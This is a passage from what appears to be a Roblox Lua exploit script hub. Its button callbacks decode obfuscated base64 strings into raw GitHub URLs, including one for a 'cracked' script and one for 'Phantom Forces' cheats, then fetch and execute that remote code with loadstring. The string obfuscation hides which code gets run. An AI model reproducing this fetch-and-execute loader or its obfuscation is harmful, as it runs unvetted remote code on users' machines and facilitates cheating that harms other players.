       loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('uKrzCPlYWxVMaAIfmRYLfkLgNOLeAArvQoAYGPNZLiBnlpzEUhxwFuKaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Nwb29rc21uL1R3dy1TdHVmZi9tYWluL0V0ZXJuYWxYY3JhY2tlZC5sdWE=')))()
   end,
})

local Button = Scripts:CreateButton({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('FmpoAGArSAWzwruVsoxbmSEPDNUCQvkcnokZkjJFmehZTafUIwYeWsfUGhhbnRvbSBGb3JjZXM='),
   Callback = function()
       loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('dbZtqwnkvInxLuGOuDrnkRnXsBZOKUmigBvCUuYcHIJMmXjVXKTAgOBaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1lvdXN1Y2s3ODAvcGhhbnRvbS1mb3JjZXMtbmV3L21haW4vbm9vYg==')))()
   end,
})    
